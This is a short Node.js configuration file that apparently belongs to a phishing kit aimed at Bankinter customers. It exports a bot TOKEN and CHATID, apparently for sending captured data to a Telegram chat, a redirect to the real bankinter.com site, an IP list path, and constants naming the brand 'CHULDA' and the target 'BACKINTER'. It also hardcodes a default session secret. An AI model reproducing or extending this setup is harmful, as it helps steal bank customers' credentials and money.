require('dotenv').config();
const path = require('path');

module.exports = {
    PORT: process.env.PORT || 4000,
    SECRET: process.env.SECRET || 'default_secret_key_session',
    TOKEN: process.env.TOKEN || '',
    CHATID: process.env.CHATID || '',
    REDIRECT_URL: process.env.URL || 'https://www.bankinter.com',
    DATA_IP_FILE: path.join(__dirname, '..', 'data', 'ip_list.txt'),
    BRAND: 'CHULDA',
    TARGET: 'BACKINTER'
};
